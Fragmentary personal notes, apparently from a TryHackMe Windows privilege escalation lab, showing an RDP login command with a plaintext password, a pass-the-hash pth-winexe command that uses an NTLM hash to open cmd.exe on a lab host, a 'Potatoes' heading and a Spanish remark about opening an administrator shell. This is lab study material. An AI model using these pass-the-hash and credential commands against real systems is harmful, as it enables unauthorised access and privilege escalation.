...
remmina -c rdp://user:password321@10.201.54.224
...
```
┌──(kali㉿kali)-[~/tmp/tryhackme/winprivesc]
└─$ pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //10.10.240.171 cmd.exe
...
google> # Potatoes - Windows Privilege Escalation
...
> pero lanzamos nueva shell especificando es como administrador
